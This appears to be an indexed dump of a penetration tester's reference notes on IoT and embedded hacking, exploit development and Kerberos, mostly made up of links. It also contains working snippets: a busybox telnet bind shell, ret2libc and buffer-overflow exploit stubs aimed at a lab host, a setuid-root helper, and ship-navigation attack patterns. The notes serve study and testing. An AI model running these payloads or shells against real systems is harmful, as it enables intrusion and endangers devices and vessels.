https://github.com/649/Crashcast-Exploit Project Alias is an open-source parasite to train custom wake-up names for smart home devices while disturbing their built-in microphone: https://github.com/bjoernkarmann/project_alias 35C3 - Modchips of the State: https://www.youtube.com/watch?v=C7H3V7tkxeA (BNC backdoor designed to be inserted into a resistor sitting between the SPI flash and the BNC chip) Rooting the FireTV Cube and Pendant with FireFU: https://blog.exploitee.rs/2018/rooting-the-firetv-cube-and-pendant-with-firefu/ Thunderclap https://twitter.com/marcan42/status/1100655030711939072 The ESP8266-Powered Masterkey Wi-Fi USB Keylogger Offers Plug-and-Play Capture, Remote Access: https://www.hackster.io/news/the-esp8266-powered-masterkey-wi-fi-usb-keylogger-offers-plug-and-play-capture-remote-access-1ebfc61d5b8c Defense - Copy Protection in Modern Microcontrollers: https://www.cl.cam.ac.uk/~sps32/mcu_lock.html Summarized References https://limitedresults.com/2019/01/pwn-the-lifx-mini-white/","title":"Embedded and iot"},{"location":"embedded-and-iot/#lab-setup","text":"RPi as poor man's hardware hacking tool: https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool/ https://systemoverlord.com/static/attachments/iot_toolkit.pdf OSH Stencils: https://www.oshstencils.com","title":"Lab Setup"},{"location":"embedded-and-iot/#quick-reference","text":"Cross Compiling - Compile for MIPS: mips - linux - gnu - gcc bindshell . c - o bindshell - static mips - linux - gnu - strip bindshell ESP Read Flash: esptool . py - p / dev / ttyUSB0 - b 460800 read_flash 0 0 x200000 flash . bin Check Device config: espefuse . py --port /dev/ttyUSB0 summary Binwalk Display information: binwalk - t - vvv example - firmware Extract: binwalk - e - t - vvv example - firmware Entropy Analysis (identity compression / encryption): binwalk - E example - firmware http://www.devttys0.com/2013/06/differentiate-encryption-from-compression-using-math/ Repacking Firmware https://github.com/rampageX/firmware-mod-kit/wiki . / extract - firmware . sh example - firmware . bin . / build - formware . sh Busybox Command Injection: https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/ Bind a telnet shell to port 9999: / bin / busybox telnetd - l / bin / sh - p9999 QMUE Run binaries inside a firmware whereis qemu - mips - static cp / etc / example / qemu - mips - static squashfs - root # From squashfs - root chroot . / . / qemu - mips - static bin / ls","title":"Quick Reference"},{"location":"embedded-and-iot/#test-scenarios","text":"Replaying of sensor communication Pair device with controlling application without authorization Using guessable identifiers for linking WiFi and other credentials stored in flash","title":"Test Scenarios"},{"location":"embedded-and-iot/#techniques","text":"Glitching Voltage glitching attacks: https://twitter.com/d_olex/status/1084700474043813895 Side Channel Intel TLBleed: https://www.theregister.co.uk/2018/06/22/intel_tlbleed_key_data_leak/","title":"Techniques"},{"location":"embedded-and-iot/#collections","text":"Searchable FCC ID Database: https://fccid.io/ Command to download all FCC ID documents: https://rehmann.co/blog/command-download-fcc-id-documents/ for i in $ ( seq 3 4200000 ) ; do curl \u2013referer \u2018https://apps.fcc.gov/oetcf/eas/reports/ViewExhibitReport.cfm\u2019 \u2018https://apps.fcc.gov/eas/GetApplicationAttachment.html?calledFromFrame=Y id=\u2019$i -o $i; done","title":"Collections"},{"location":"embedded-and-iot/#protocols","text":"","title":"Protocols"},{"location":"embedded-and-iot/#uart-serial","text":"All clock speeds are set independently of the signal baud rate is the rate at which bits will be transmitted (bits per second). There is one start bit. There is one stop bit (a low voltage cycle). 8 data bits in the middle. 1 parity bit at the end of the data. Settings Number of data bits/number of parity bits/number of stop bits 8/N/1 (8N1) means 8 data bits, No parity bit, and 1 stop bit Common Baud Rates 9600 19200 38400 57600 115200 Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware UART to Root [Pending]: https://exfil.co/2019/02/14/uart-to-root-the-harder-way/","title":"UART / Serial"},{"location":"embedded-and-iot/#spi","text":"MISO - Master In Slave Out - Data flow from the slave units to the master unit MOSI - Master Out Slave In - Data flow from the master unit to the slave units SCLK - The clock signal pin - Rising edge of the clock triggers the level of MISO/MOSI to be read as the current bit by the target device. SS / CS - Slave / Chip Select - Select a device, this pin is grounded, telling the particular device to listen up. VCC / GND Typical https://en.wikipedia.org/wiki/Chip_select Daisy Chained The SPI port of each slave is designed to send out during the second group of clock pulses an exact copy of the data it received during the first group of clock pulses. The whole chain acts as a communication shift register. Daisy chaining is often done with shift registers to provide a bank of inputs or outputs through SPI. Each slave copies input to output in the next clock cycle until active low SS line goes high. SPI mode - is the combination of CPOL and CPHA CPOL - Polarity of the clock CPOL=0 is a clock which idles at 0 - Leading edge is a rising edge - Trailing edge is a falling edge CPOL=1 is a clock which idles at 1 - Leading edge is a falling edge - Trailing edge is a rising edge CPHA - Timing of the data bits relative to the clock pulses CPHA=0 - \"out\" side changes the data on the trailing edge of the preceding clock cycle, while the \"in\" side captures the data on (or shortly after) the leading edge of the clock cycle - First bit must be on the MOSI line before the leading clock edge CPHA=1 - \"out\" side changes the data on the leading edge of the current clock cycle, while the \"in\" side captures the data on (or shortly after) the trailing edge of the clock cycle - For the last cycle, the slave holds the MISO line valid until slave select is deasserted. https://en.wikipedia.org/wiki/Serial_Peripheral_Interface","title":"SPI"},{"location":"embedded-and-iot/#i2c","text":"","title":"I2C"},{"location":"embedded-and-iot/#jtag","text":"TDI - Test Data In TDO - Test Data Out - When you daisychain IC\u2019s with JTAG, the TDO of one goes to the TDI of the next, until it loops back to the debug header. TCK - Test Clock - JTAG clock signal, the rising edge triggering a read operation. TCK is not chained, but rather forms a \u2019test clock bus\u2019 along with TMS each IC can see the clock and TMS signals. TMS - Test Mode Select - Read as the clock signal rises, and determines the next state of the internal JTAG controller TRST - Test Reset - An optional pin that can reset the internal test controller, but this isn\u2019t required. Test Access Port (TAP) Controller to handle JTAG commands Minimally 3 registers (instruction register, 2 or more data registers) State-machine that uses the TMS level to decide what to do after each clock cycle TAP controller connects to the boundary cells Boundary Cells can raise/lower a leg\u2019s voltage to influence the behavior of the chip Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware","title":"JTAG"},{"location":"embedded-and-iot/#swd","text":"","title":"SWD"},{"location":"embedded-and-iot/#tools","text":"Glasgow = Bus Pirate + Bus Blaster + Logic Sniffer https://github.com/whitequark/Glasgow https://twitter.com/whitequark/status/985040607864176640 https://twitter.com/marcan42/status/1090564121068593153 Cutdown version of starshipraider: https://github.com/azonenberg/starshipraider OpenWRT USB Storage: https://openwrt.org/docs/guide-user/storage/usb-drives https://openwrt.org/docs/guide-user/additional-software/extroot_configuration https://wiki.openwrt.org/doc/howto/usb.storage https://wiki.openwrt.org/doc/howto/extroot FACT - The Firmware Analysis and Comparison Tool: https://fkie-cad.github.io/FACT_core/ Platform Firmware Auditing Tool: https://github.com/PreOS-Security/fwaudit BIOS - https://github.com/chipsec/chipsec","title":"Tools"},{"location":"embedded-and-iot/#specific","text":"","title":"Specific"},{"location":"embedded-and-iot/#jammers","text":"Open Source ESP8266 Based Laser Jammer: https://github.com/hevnsnt/NOTCHACOTCHA","title":"Jammers"},{"location":"embedded-and-iot/#wifi-wireless","text":"SecKC ESP8266 Captive Portal and Hacking Challenge: https://github.com/hevnsnt/cotcha","title":"WiFI / Wireless"},{"location":"embedded-and-iot/#atms","text":"References: ATM LOGIC ATTACKS: SCENARIOS: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/ATM-Vulnerabilities-2018-eng.pdf","title":"ATMs"},{"location":"embedded-and-iot/#automobile","text":"Tools: canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1 References: Automobile Hacking, Part 1: The CAN Protocol: https://www.hackers-arise.com/single-post/2017/08/04/Automobile-Hacking-Part-1-The-CAN-Protocol Automobile Hacking, Part 2: The can-utils or SocketCAN: https://www.hackers-arise.com/single-post/2017/08/08/Automobile-Hacking-Part-2-The-can-utils-or-SocketCAN Automobile Hacking, Part 3: Metasploit for Car Hacking: https://www.hackers-arise.com/single-post/2017/10/19/Automobile-Hacking-Part-3-Metasploit-for-Car-Hacking Automobile Hacking, Part 4: How to Hack the Keyless Entry System: https://www.hackers-arise.com/single-post/2018/12/05/Automobile-Hacking-Part-4-How-to-Hack-the-Keyless-Entry-System Awesome Vehicle Security: https://github.com/jaredthecoder/awesome-vehicle-security https://twitter.com/0xcharlie/status/1014892446495305733","title":"Automobile"},{"location":"embedded-and-iot/#bluetooth","text":"References: A Bluetooth low energy capture the flag: https://github.com/hackgnar/ble_ctf My notes on Hacking BLE \u2013 list of resources: https://www.davidsopas.com/my-notes-on-hacking-ble-list-of-resources/","title":"Bluetooth"},{"location":"embedded-and-iot/#cameras","text":"Tools: Pentax Hacker Development Kit: https://github.com/i-am-shodan/PHDK https://www.dropbox.com/s/ogez7sb4b0cw92g/hacking_pentax_k30.pdf Canon Hack Development Kit: http://chdk.wikia.com/wiki/CHDK","title":"Cameras"},{"location":"embedded-and-iot/#locks","text":"**References: ** How to open a Tapplock over BLE in under two seconds: https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/","title":"Locks"},{"location":"embedded-and-iot/#printers","text":"Discovery: Windows SharpPrinter - Discover Printers: https://github.com/rvrsh3ll/SharpPrinter ListNetworks - Enumerate all visible network printers in local network: https://github.com/vinifr/-ListNetworks Linux Praeda - Automated printer data harvesting tool: http://h.foofus.net/?page_id=218 Exploitation: PRET - Printer Exploitation Toolkit: https://github.com/RUB-NDS/PRET praedasploit - https://github.com/MooseDojo/praedasploit Attack Patterns: Plunder Pillage Print: https://hackinparis.com/data/slides/2014/DeralHeilandandPeterArzamendi.pdf LDAP/SMB/SMTP Pass-Back-Attack: http://foofus.net/goons/percx/praeda/pass-back-attack.pdf LDAP - power address book functionality SMB - saving scans to file shares SMTP - scan to email Export configuration and look for credentials LDAP traffic is unencrypted (usually), can MITM Guides: An Introduction to Printer Exploitation: https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565","title":"Printers"},{"location":"embedded-and-iot/#ships","text":"Shodan Searches: org:\"Inmarsat Solutions US\" Login for Globe wireless title:\"sailor 900\" Sat antenna details Exploit: https://www.exploit-db.com/exploits/35932 Default credentials: admin/1234 html:commbox KVH CommBox terminals Vessel name / network structure leaked \"Show Users\" link (or can request the content by appending /rest.php?action=QCgetActiveUsers) **Tools: ** Vuln Ship Tracker: https://ptp-shiptracker.herokuapp.com/ Terms: ECDIS are the electronic chart systems that are needed to navigate. AIS transceiver - system that ships use to avoid colliding with each other. NMEA 0183 messages Ethernet and serial networks are often \u2018bridged\u2019 at several points (GPS,satcom terminal, ECDIS) OT systems are used to control the steering gear, engines, ballast pumps and lots more. They communicate using NMEA 0183 messages. No message authentication, encryption or validation (only 2 byte XOR checksum) Attack Patterns: Spoof the ECDIS using the vulnerable config interface, 'grow' the ship and 'jump' it in to the shipping lanes. Other ships AIS will alert the ships captain to a collision scenario MitM and change NMEA 0183 messages to read differently Ex: change the rudder command by modifying a GPS autopilot command References: Summarized References: https://www.pentestpartners.com/security-blog/osint-from-ship-satcoms/ https://www.pentestpartners.com/security-blog/hacking-tracking-stealing-and-sinking-ships/","title":"Ships"},{"location":"embedded-and-iot/#uefi","text":"References: UEFI_EXPLOITATION_MASSES_FINAL: https://github.com/eclypsium/Publications/blob/master/2018/DEFCON26/DC26_UEFI_EXPLOITATION_MASSES_FINAL.pdf Tools: EDK II Project - A modern, feature-rich, cross-platform firmware development environment for the UEFI and PI specifications from www.uefi.org : https://github.com/tianocore/edk2 RaspberryPiPkg - 64-bit Tiano Core UEFI for the Raspberry Pi 3 (with devices, Linux, NetBSD, FreeBSD and Windows on Arm!): https://github.com/andreiw/RaspberryPiPkg uefi-firmware-parser - Parse BIOS/Intel ME/UEFI firmware related structures: Volumes, FileSystems, Files, etc: https://github.com/theopolis/uefi-firmware-parser","title":"UEFI"},{"location":"embedded-and-iot/#ctfs-and-practice","text":"Capture the Signal! https://www.trendmicro.com/cts/","title":"CTFs and Practice"},{"location":"embedded-and-iot/#references","text":"","title":"References"},{"location":"embedded-and-iot/#new-references","text":"Twinkly Twinkly Little Star: https://labs.mwrinfosecurity.com/blog/twinkly-twinkly-little-star search for Xiaomi scooters lock unlock the devices: https://github.com/rani-i/Mi365Locker Mass play any YouTube video, terminate apps and rename Chromecast device(s) obtained from Shodan.io: https://github.com/649/Crashcast-Exploit Project Alias is an open-source parasite to train custom wake-up names for smart home devices while disturbing their built-in microphone: https://github.com/bjoernkarmann/project_alias 35C3 - Modchips of the State: https://www.youtube.com/watch?v=C7H3V7tkxeA (BNC backdoor designed to be inserted into a resistor sitting between the SPI flash and the BNC chip) Rooting the FireTV Cube and Pendant with FireFU: https://blog.exploitee.rs/2018/rooting-the-firetv-cube-and-pendant-with-firefu/ Thunderclap https://twitter.com/marcan42/status/1100655030711939072 The ESP8266-Powered Masterkey Wi-Fi USB Keylogger Offers Plug-and-Play Capture, Remote Access: https://www.hackster.io/news/the-esp8266-powered-masterkey-wi-fi-usb-keylogger-offers-plug-and-play-capture-remote-access-1ebfc61d5b8c Defense - Copy Protection in Modern Microcontrollers: https://www.cl.cam.ac.uk/~sps32/mcu_lock.html","title":"New References"},{"location":"embedded-and-iot/#summarized-references","text":"https://limitedresults.com/2019/01/pwn-the-lifx-mini-white/","title":"Summarized References"},{"location":"exploits_and_shellcoding/","text":"Quick Reference Hexdump (python format): hexdump - v - e \\\\ x 1/1 %02x example . exe Print hex encoded string in text: printf $ ( cat file . txt | tr - d \\n ) Passing binary data as arguments: command $ ( python - c print ... ) Passing binary data as standard input: python - c print ... | command Use file as input and then read from standard input: cat file - | command python - c print ... | cat file - | command Cross compile with - mingw32 i586 - mingw32msvc - gcc a . c wine a . exe export file = shell i686 - w64 - mingw32 - gcc - c - O3 - march = i686 $ file . c i686 - w64 - mingw32 - gcc $ file . o - o $ file . exe - O3 - march = i686 - Wl , - lws2_32 / usr / i686 - w64 - mingw32 / bin / strip $ file . exe Printing shell code ( Bash ) echo - e \\x31\\xc0\\x50\\x68\\x2f... ( Python ) python - c print \\x31\\xc0\\x50\\x68\\x2f... ( Perl ) perl - e print \\x31\\xc0\\x50\\x68\\x2f... Fuzzing Tools American fuzzy lop is a security-oriented fuzzer: http://lcamtuf.coredump.cx/afl/ A fork of AFL for fuzzing Windows binaries: https://github.com/googleprojectzero/winafl Using WinAFL to Fizz WinRar (unacev2.dll): https://research.checkpoint.com/extracting-code-execution-from-winrar/ FoRTE-Research's Fuzzing Benchmarks: https://github.com/FoRTE-Research/FoRTE-FuzzBench Buffer Overflow Introductions Buffer Overflow Attack - Computerphile: https://www.youtube.com/watch?v=1S0aBV-Waeo Binary Exploitation - Buffer Overflow Explained in Detail: https://0xrick.github.io/binary-exploitation/bof1/ Tools - Detection / Testing: - Program to detect the existence of remote / local stack-based buffer-overflow vulnerabilities (FTP, IMAP, POP3 and SMTP): https://github.com/iricartb/buffer-overflow-vulnerability-services-tester-tool - https://hakin9.org/bovstt-buffer-overflow-vulnerability-services-tester-tool/ Techniques ret2libc Find libc address: \u200b ldd / usr / local / bin / backup Find libc system function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep system Find libc exit function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep exit Find libc / bin / sh reference: \u200b strings - a - t x / lib / i386 - linux - gnu / libc . so . 6 | grep / bin / sh Practice https://github.com/justinsteven/dostackbufferoverflowgood vsftpd backdoor: https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html HTB - Octomber: / usr / local / bin / ovrflw Exploit Stubs import struct , subprocess libc = 0xf75e2000 sysOffset = 0x0003a940 sysAddress = libc + sysOffset exitOffset = 0x0002e7b0 exitAddress = libc + exitOffset binsh = libc + 0x0015900b payload = A * 512 payload += struct . pack ( I , sysAddress ) payload += struct . pack ( I , exitAddress ) payload += struct . pack ( I , binsh ) attempts = 0 while True : attempts += 1 print Attempts: + attempts subprocess . call ([ /usr/local/bin/vulnerable-binary , arg1 , arg2 , payload ]) from pwn import * shellcode = payload = A * 28 + p32 ( 0xffffd630 ) + shellcode r = remote ( 10.10.10.34 , 7411 ) print r . recv ( 1024 ) r . sendline ( USER admin ) print r . recv ( 1024 ) r . sendline ( PASS + payload ) r . interactive () Simple SUID Binary #include stdio.h #include stdlib.h #include sys/types.h #include unistd.h int main () { setuid ( 0 ); setgid ( 0 ); system ( id ); return 0 ; } Lateral Movement LATERAL MOVEMENT USING THE MMC20.APPLICATION COM OBJECT: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ LATERAL MOVEMENT VIA DCOM: ROUND 2: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/ Lateral Movement Using Outlook\u2019s CreateObject Method and DotNetToJScript: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/ Defense DEP Perform additional checks on memory, to help prevent malicious code from running on a system. Prevent code execution from data pages, by raising an exception, when execution occurs. Windows - Bypass Data Execution Protection (DEP): https://0x00sec.org/t/bypass-data-execution-protection-dep/6988 Linux - Exploit Mitigation Techniques - Data Execution Prevention (DEP): https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634 ASLR Randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted. Bypass Windows Exploit Guard ASR - https://github.com/sevagas/WindowsDefender_ASR_Bypass-OffensiveCon2019 LD_PRELOAD Load a custom library and override functions of a program g ++ test . cpp - std = c ++ 11 - shared - o test . so - fPIC # PIC = Position independent code LD_PRELOAD = test . so ldd . / exampleapp Shellcode A small, null-free port binding shellcode for 32-bit versions of Windows: https://code.google.com/archive/p/w32-bind-ngs-shellcode/ Tools Windows SEToolKit \u2019s Powershell alphanumeric shellcode injector to generate a Meterpreter payload that will bypass Windows Defender Shellter - Dynamic shellcode injection tool, and the first truly dynamic PE infector ever created: [Intro] [Pro-features] Search Sploitus - https://sploitus.com/ OS w3challs syscall table - https://w3challs.com/syscalls/ Other Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil References Memorize the 8086 opcodes https://pbs.twimg.com/media/Bhx3cHdCUAIC96Y?format=png name=900x900 https://mobile.twitter.com/nocsi_/status/440358188492148736 Heap Exploitation | Playing with chunks!: https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055 Heap Exploitation - Fastbin Attack: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 Analysis of public exploits or my 1day exploits: https://github.com/externalist/exploit_playground Shellcoding for Linux and Windows Tutorial: http://www.vividmachines.com/shellcode/shellcode.html Voltron is an extensible debugger UI toolkit written in Python: https://github.com/snare/voltron Reverse Shell from an OpenVPN Configuration File: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da Programming EXEC in Many Languages: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Payloads/exec-system-languages.md Windows Specific Modern Windows Userspace Exploitation: https://media.ccc.de/v/35c3-9660-modern_windows_userspace_exploitation Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup Advice]: http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]: http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]: http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]: http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]: http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html Persistence Maintaining Access Part 1: Introduction and Metasploit Example: https://www.hackingloops.com/maintaining-access-metasploit/ Return oriented programming (ROP) 64-bit ROP | You rule \u2018em all!: https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937 SROP | Signals, you say? (Sigreturn Oriented Programming): https://0x00sec.org/t/srop-signals-you-say/2890 Interesting exploits Chrome: https://github.com/marcinguy/CVE-2020-15999","title":"Exploits and shellcoding"},{"location":"exploits_and_shellcoding/#quick-reference","text":"Hexdump (python format): hexdump - v - e \\\\ x 1/1 %02x example . exe Print hex encoded string in text: printf $ ( cat file . txt | tr - d \\n ) Passing binary data as arguments: command $ ( python - c print ... ) Passing binary data as standard input: python - c print ... | command Use file as input and then read from standard input: cat file - | command python - c print ... | cat file - | command Cross compile with - mingw32 i586 - mingw32msvc - gcc a . c wine a . exe export file = shell i686 - w64 - mingw32 - gcc - c - O3 - march = i686 $ file . c i686 - w64 - mingw32 - gcc $ file . o - o $ file . exe - O3 - march = i686 - Wl , - lws2_32 / usr / i686 - w64 - mingw32 / bin / strip $ file . exe Printing shell code ( Bash ) echo - e \\x31\\xc0\\x50\\x68\\x2f... ( Python ) python - c print \\x31\\xc0\\x50\\x68\\x2f... ( Perl ) perl - e print \\x31\\xc0\\x50\\x68\\x2f...","title":"Quick Reference"},{"location":"exploits_and_shellcoding/#fuzzing","text":"Tools American fuzzy lop is a security-oriented fuzzer: http://lcamtuf.coredump.cx/afl/ A fork of AFL for fuzzing Windows binaries: https://github.com/googleprojectzero/winafl Using WinAFL to Fizz WinRar (unacev2.dll): https://research.checkpoint.com/extracting-code-execution-from-winrar/ FoRTE-Research's Fuzzing Benchmarks: https://github.com/FoRTE-Research/FoRTE-FuzzBench","title":"Fuzzing"},{"location":"exploits_and_shellcoding/#buffer-overflow","text":"Introductions Buffer Overflow Attack - Computerphile: https://www.youtube.com/watch?v=1S0aBV-Waeo Binary Exploitation - Buffer Overflow Explained in Detail: https://0xrick.github.io/binary-exploitation/bof1/ Tools - Detection / Testing: - Program to detect the existence of remote / local stack-based buffer-overflow vulnerabilities (FTP, IMAP, POP3 and SMTP): https://github.com/iricartb/buffer-overflow-vulnerability-services-tester-tool - https://hakin9.org/bovstt-buffer-overflow-vulnerability-services-tester-tool/ Techniques ret2libc Find libc address: \u200b ldd / usr / local / bin / backup Find libc system function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep system Find libc exit function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep exit Find libc / bin / sh reference: \u200b strings - a - t x / lib / i386 - linux - gnu / libc . so . 6 | grep / bin / sh Practice https://github.com/justinsteven/dostackbufferoverflowgood vsftpd backdoor: https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html HTB - Octomber: / usr / local / bin / ovrflw Exploit Stubs import struct , subprocess libc = 0xf75e2000 sysOffset = 0x0003a940 sysAddress = libc + sysOffset exitOffset = 0x0002e7b0 exitAddress = libc + exitOffset binsh = libc + 0x0015900b payload = A * 512 payload += struct . pack ( I , sysAddress ) payload += struct . pack ( I , exitAddress ) payload += struct . pack ( I , binsh ) attempts = 0 while True : attempts += 1 print Attempts: + attempts subprocess . call ([ /usr/local/bin/vulnerable-binary , arg1 , arg2 , payload ]) from pwn import * shellcode = payload = A * 28 + p32 ( 0xffffd630 ) + shellcode r = remote ( 10.10.10.34 , 7411 ) print r . recv ( 1024 ) r . sendline ( USER admin ) print r . recv ( 1024 ) r . sendline ( PASS + payload ) r . interactive () Simple SUID Binary #include stdio.h #include stdlib.h #include sys/types.h #include unistd.h int main () { setuid ( 0 ); setgid ( 0 ); system ( id ); return 0 ; }","title":"Buffer Overflow"},{"location":"exploits_and_shellcoding/#lateral-movement","text":"LATERAL MOVEMENT USING THE MMC20.APPLICATION COM OBJECT: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ LATERAL MOVEMENT VIA DCOM: ROUND 2: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/ Lateral Movement Using Outlook\u2019s CreateObject Method and DotNetToJScript: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/","title":"Lateral Movement"},{"location":"exploits_and_shellcoding/#defense","text":"DEP Perform additional checks on memory, to help prevent malicious code from running on a system. Prevent code execution from data pages, by raising an exception, when execution occurs. Windows - Bypass Data Execution Protection (DEP): https://0x00sec.org/t/bypass-data-execution-protection-dep/6988 Linux - Exploit Mitigation Techniques - Data Execution Prevention (DEP): https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634 ASLR Randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted. Bypass Windows Exploit Guard ASR - https://github.com/sevagas/WindowsDefender_ASR_Bypass-OffensiveCon2019","title":"Defense"},{"location":"exploits_and_shellcoding/#ld_preload","text":"Load a custom library and override functions of a program g ++ test . cpp - std = c ++ 11 - shared - o test . so - fPIC # PIC = Position independent code LD_PRELOAD = test . so ldd . / exampleapp","title":"LD_PRELOAD"},{"location":"exploits_and_shellcoding/#shellcode","text":"A small, null-free port binding shellcode for 32-bit versions of Windows: https://code.google.com/archive/p/w32-bind-ngs-shellcode/","title":"Shellcode"},{"location":"exploits_and_shellcoding/#tools","text":"Windows SEToolKit \u2019s Powershell alphanumeric shellcode injector to generate a Meterpreter payload that will bypass Windows Defender Shellter - Dynamic shellcode injection tool, and the first truly dynamic PE infector ever created: [Intro] [Pro-features] Search Sploitus - https://sploitus.com/ OS w3challs syscall table - https://w3challs.com/syscalls/ Other Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil","title":"Tools"},{"location":"exploits_and_shellcoding/#references","text":"Memorize the 8086 opcodes https://pbs.twimg.com/media/Bhx3cHdCUAIC96Y?format=png name=900x900 https://mobile.twitter.com/nocsi_/status/440358188492148736 Heap Exploitation | Playing with chunks!: https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055 Heap Exploitation - Fastbin Attack: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 Analysis of public exploits or my 1day exploits: https://github.com/externalist/exploit_playground Shellcoding for Linux and Windows Tutorial: http://www.vividmachines.com/shellcode/shellcode.html Voltron is an extensible debugger UI toolkit written in Python: https://github.com/snare/voltron Reverse Shell from an OpenVPN Configuration File: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da Programming EXEC in Many Languages: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Payloads/exec-system-languages.md Windows Specific Modern Windows Userspace Exploitation: https://media.ccc.de/v/35c3-9660-modern_windows_userspace_exploitation Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup Advice]: http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]: http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]: http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]: http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]: http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html Persistence Maintaining Access Part 1: Introduction and Metasploit Example: https://www.hackingloops.com/maintaining-access-metasploit/ Return oriented programming (ROP) 64-bit ROP | You rule \u2018em all!: https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937 SROP | Signals, you say? (Sigreturn Oriented Programming): https://0x00sec.org/t/srop-signals-you-say/2890","title":"References"},{"location":"exploits_and_shellcoding/#interesting-exploits","text":"Chrome: https://github.com/marcinguy/CVE-2020-15999","title":"Interesting exploits"},{"location":"iam-kerberos/","text":"IAM - Kerberos Protocol Summary Designed to lessening authentication related packets transmitted in the network Not designed for today's network security Loosing KDC means, security is at total loss Kerberos uses either UDP / 88 or TCP / 88 as transport protocol. Hence Kerberos itself is responsible of encrypting data. Several agents working together: Client or user: who wants to access to the service. AP ( Application Server ) : offers the service required by the user. KDC ( Key Distribution Center ) : main service of Kerberos, responsible of issuing the tickets, installed on the DC (Domain Controller). It is supported by the AS ( Authentication Service ) , which issues the TGTs . Keys: KDC key or krbtgt key : Derivate from krbtgt account NTLM hash. User key : Derivate from user NTLM hash. Service key : Derivate from the NTLM hash of service owner, which can be an user or computer account. Session key : Negotiated between the user and KDC. Service session key : to be use between user and service. Tickets: TGS ( Ticket Granting Service ) : Ticket which user can use to authenticate against a service. It is encrypted with the service key. TGT ( Ticket Granting Ticket ) : Ticket presented to the KDC to request for TGSs. It is encrypted with the KDC key. PAC ( Privilege Attribute Certificate ) is an structure included in almost every ticket. It is possible to services to verify the PAC by communicating with the KDC Messages: KRB_AS_REQ : Used to request the TGT to KDC. KRB_AS_REP : Used to deliver the TGT by KDC. KRB_TGS_REQ : Used to request the TGS to KDC, using the TGT. KRB_TGS_REP : Used to deliver the TGS by KDC. KRB_AP_REQ : Used to authenticate a user against a service, using the TGS. KRB_AP_REP : (Optional) Used by service to identify itself against the user. KRB_ERROR : Message to communicate error conditions. KERB_VERIFY_PAC_REQUEST : AP send message to 